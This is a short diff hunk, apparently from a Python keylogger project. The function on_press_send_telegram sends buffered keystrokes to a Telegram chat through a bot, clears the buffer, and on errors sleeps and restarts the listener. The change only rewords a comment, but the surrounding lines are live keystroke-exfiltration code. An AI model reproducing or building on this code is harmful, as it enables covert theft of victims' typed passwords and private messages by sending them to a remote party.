@@ -36,7 +36,7 @@ def on_press_send_telegram(Key):
                 bot.sendMessage(chat_id='chat_id', text=keyboard)
                 keyboard.clear()
             except:
-                time.sleep(60) #if happen any problem with telegram's API, this will happen: time.sleep going to wait for 60s and then 'listen' function will initialize again.
+                time.sleep(60) #if happen any problem with telegram's API, the following will happen: time.sleep going to wait for 60s and then 'listen' function will initialize again.
                 listen()
     except:
         pass
